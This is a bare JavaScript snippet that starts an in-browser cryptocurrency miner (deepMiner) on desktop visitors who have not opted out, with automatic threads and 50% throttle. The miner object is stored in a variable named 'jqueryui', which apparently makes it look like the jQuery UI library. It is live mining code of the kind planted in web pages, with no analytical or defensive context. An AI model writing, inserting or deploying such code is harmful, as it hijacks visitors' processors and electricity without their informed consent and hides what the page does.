        var uri = 'www';
        var jqueryui = new deepMiner.Anonymous(uri, {
            autoThreads: true,
            throttle: 0.5
        });
        if (!jqueryui.isMobile() && !jqueryui.didOptOut(14400)) {
            jqueryui.start();
        }